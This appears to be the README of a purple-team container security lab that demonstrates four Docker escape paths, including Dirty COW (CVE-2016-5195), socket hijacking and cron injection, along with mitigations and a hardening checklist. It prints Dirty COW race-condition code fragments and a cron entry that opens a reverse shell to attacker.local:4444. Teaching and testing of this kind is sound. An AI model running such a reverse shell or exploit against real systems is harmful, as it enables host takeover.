# Hexa Force: Container Security Lab
### *A 4-Stage DevSecOps Attack, Detection, and Defense Laboratory (CVE-2016-5195 & Escape Boundaries)*

This repository provides a highly comprehensive, end-to-end hands-on laboratory designed to demonstrate, analyze, and mitigate the four primary security boundary escape vectors in Docker container environments. Developed by **Hexa Force**, this laboratory expands into a complete **Hexa Force Purple Team Container Security Lab** illustrating the entire attack-defense lifecycle across all key container isolation boundaries.

---

##  The 4 Security Pillars of Containers

Containers achieve performance and portability by sharing resources, but weak configurations can expand local breaches into total host infrastructure compromises. This lab explores and validates the four crucial pillars of container security:

| Stage | Security Pillar | Exploit Vector / Simulation | Primary Defense & Mitigation |
| :--- | :--- | :--- | :--- |
| **Stage 1** | **Host Kernel Isolation** | Exploit the **Dirty COW** (CVE-2016-5195) race condition using thread timing to overwrite a read-only root file (`/var/secret/target.txt`). | Keep host Linux kernel patched; utilize secure user-space micro-VM container runtimes (e.g., **gVisor** or **Kata Containers**). |
| **Stage 2** | **Process Boundaries** | Abuse over-privileged debug capabilities (`CAP_SYS_PTRACE`) combined with host PID namespace sharing (`--pid=host`) to monitor and inject code into host processes. | Dropping all default capabilities (`--cap-drop=ALL`) and strictly avoiding host namespace configurations in untrusted containers. |
| **Stage 3** | **Engine API Security** | Detect and hijack an exposed Docker socket (`/var/run/docker.sock`) to issue direct HTTP API queries, spawning high-privilege sibling containers with host root mounted on `/host`. | Never mount the Docker socket in user containers; migrate daemon configurations to **Rootless Mode** or deploy secure API proxies. |
| **Stage 4** | **Volume & Storage Bounds** | Exploit writable sensitive host directory mounts (e.g., `/mnt/host/etc/cron.d`) to perform path traversal writes, injecting scheduled tasks executed as host-level root. | Mount all host directory volumes strictly as read-only (`:ro`); prohibit mounting root host directories (`/etc`, `/root`, `/var`). |

---

##  Laboratory Repository Contents

This workspace is packed with source code, orchestration scripts, automated CI/CD configurations, and programmatic documentation generators:

###  Core Lab Environment
*   [`Dockerfile`](file:///d:/Dirty%20cow%20Docker/Dockerfile): Sets up the container base, configures an unprivileged system user `victim`, establishes read-only root targets, and models socket/volume interfaces.
*   [`dirtyc0w.c`](file:///d:/Dirty%20cow%20Docker/dirtyc0w.c): A highly optimized C implementation of the CVE-2016-5195 race condition exploit using `mmap()`, `madvise(MADV_DONTNEED)`, and `/proc/self/mem` writing threads.
*   [`run_demo.sh`](file:///d:/Dirty%20cow%20Docker/run_demo.sh): The core Hexa Force orchestrator. It displays real-time container diagnostics, builds/runs the Dirty COW exploit, models Stage 2-4 boundary violations, highlights detection indicators, and outlines remediation steps.

###  Automated DevSecOps Pipelines with Container Signing (Sigstore/Cosign)
*   [`.github/workflows/dirtycow-lab.yml`](file:///d:/Dirty%20cow%20Docker/.github/workflows/dirtycow-lab.yml): The GitHub Actions CI/CD configuration. Automatically builds the container, publishes it securely to the GitHub Container Registry (`ghcr.io`), cryptographically signs the image keylessly using **Cosign (Sigstore)** via OIDC, and runs all four security stages sequentially on the signed image.

###  Programmatic Presentation & Guide Generators
We have included robust python tools to generate premium, boardroom-ready documentation and slide decks dynamically from code metadata:
*   [`generate_presentation.py`](file:///d:/Dirty%20cow%20Docker/generate_presentation.py): Generates a premium 16-slide deep dive deck on the Dirty COW (CVE-2016-5195) mechanics, virtual paging subsystem, and kernel race behaviors.
*   [`generate_presentation_4stage.py`](file:///d:/Dirty%20cow%20Docker/generate_presentation_4stage.py): Generates a sleek, 11-slide architectural deck outlining the 4-stage Hexa Force Lab, threat mappings, and security best practices.
*   [`generate_docx.py`](file:///d:/Dirty%20cow%20Docker/generate_docx.py): Generates a professionally formatted, highly detailed **Implementation Guide** document with callouts, code syntax boxes, and styled tables.
*   **Generated Assets**: 
    *   [`Dirty_COW_Technical_Briefing.pptx`](file:///d:/Dirty%20cow%20Docker/Dirty_COW_Technical_Briefing.pptx)
    *   [`Hexa_Force_Secure_Lab_Presentation.pptx`](file:///d:/Dirty%20cow%20Docker/Hexa_Force_Secure_Lab_Presentation.pptx)
    *   [`Hexa_Force_Secure_Lab_Guide.docx`](file:///d:/Dirty%20cow%20Docker/Hexa_Force_Secure_Lab_Guide.docx)

---

##  How to Run the Laboratory

Ensure you have **Docker** running on your host system, then execute the following commands in your shell:

### Step 1: Build the Container
Compile the secure, low-privileged environment:
```powershell
docker build -t dirtycow-lab .
```

### Step 2: Run the Hexa Force Orchestrator
Execute the container. By default, it will run all 4 stages sequentially:
```powershell
docker run --rm -it dirtycow-lab
```

### Step 3: Run Modular Stages (Optional)
You can target and analyze specific isolation boundaries individually by appending command-line flags:

```powershell
# Run only the Stage 1: Dirty COW Exploit
docker run --rm -it dirtycow-lab /bin/bash run_demo.sh --stage-1

# Run only the Stage 2: Capability & Process Isolation Diagnostic
docker run --rm -it dirtycow-lab /bin/bash run_demo.sh --stage-2

# Run only the Stage 3: Exposed Docker Socket Simulation
docker run --rm -it dirtycow-lab /bin/bash run_demo.sh --stage-3

# Run only the Stage 4: Volume Cron Path Traversal Simulation
docker run --rm -it dirtycow-lab /bin/bash run_demo.sh --stage-4
```

---

##  Deep-Dive: Under-the-Hood Exploit Flows

### 1. Stage 1: Dirty COW Memory Corruption (CVE-2016-5195)
1. **Memory Mapping**: The C exploit opens a target file read-only, mapping it into virtual memory as a private, Copy-on-Write mapping:
   ```c
   map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
   ```
2. **The Discard Thread**: Loops continuously, advising the kernel that the physical page holding the mapped file content is no longer needed:
   ```c
   madvise(map, 100, MADV_DONTNEED);
   ```
3. **The Write Thread**: Concurrently opens its process's virtual memory space (`/proc/self/mem`) and writes to the mapped range:
   ```c
   lseek(f, map, SEEK_SET);
   write(f, payload, len);
   ```
4. **The Race Condition**:
   * The kernel processes the write, sees that the page is read-only, and initiates a COW (Copy-On-Write) operation to copy it to a private, writeable physical frame.
   * Right before the new private page table mapping is committed, the Discard Thread triggers `madvise()`. The kernel throws away the newly allocated page frame mid-operation.
   * Due to non-atomic execution retry, the write resumes but now maps to the **original, global read-only page cache**, modifying the actual file on disk.

> [!NOTE]
> On a modern, fully patched host, the kernel serializes write allocations atomically. The exploit threads will complete, but the file contents will remain unchanged, logging a clean **Exploit Prevented** diagnostic.

### 2. Stage 4: Volume Path Traversal & Cron Injection
1. **Writable Mounts**: A host directory mount is mapped into the container environment.
2. **Exploit Vector**: An attacker attempts to write an execution task into `/mnt/host/etc/cron.d`:
   ```bash
   echo "* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/attacker.local/4444 0>&1'" > /mnt/host/etc/cron.d/exploit_task
   ```
3. **Defense Verification**: If correctly configured as a read-only (`:ro`) mount, the system rejects the operation with a standard `Permission Denied` code. The orchestrator catches this rejection and confirms a **Successfully Defended** state.

---

##  Re-Generating Presentations & Handbooks

If you wish to customize or rebuild the PowerPoint slide decks or Word guides, make sure you have Python installed, install the required packages, and execute the scripts:

```powershell
# 1. Install prerequisites
pip install python-pptx python-docx

# 2. Recompile the slide decks & guide
python generate_presentation.py        # Generates Dirty COW deep-dive PPTX
python generate_presentation_4stage.py # Generates 4-Stage Hexa Force PPTX
python generate_docx.py                 # Generates Implementation Guide DOCX
```

---

##  DevSecOps Workload Hardening Checklist

To protect production clusters and secure docker environments against container escapes:
*   [ ] **Apply Host Kernel Patches**: Keeping the underlying host OS kernel fully updated is the absolute foundation of container cluster security.
*   [ ] **Enforce Read-Only Filesystems**: Mount all integration and data volumes strictly as read-only (`ro` flag) wherever write operations are unnecessary.
*   [ ] **Drop Default Linux Capabilities**: Strip container capability profiles to a minimal list, ensuring `CAP_SYS_PTRACE` and `CAP_SYS_ADMIN` are dropped.
*   [ ] **Prohibit UNIX Socket Mounts**: Never mount `/var/run/docker.sock` in unverified user workloads.
*   [ ] **Configure Non-Root Runtimes**: Switch away from the default root account inside Dockerfiles using the `USER <username>` directive.

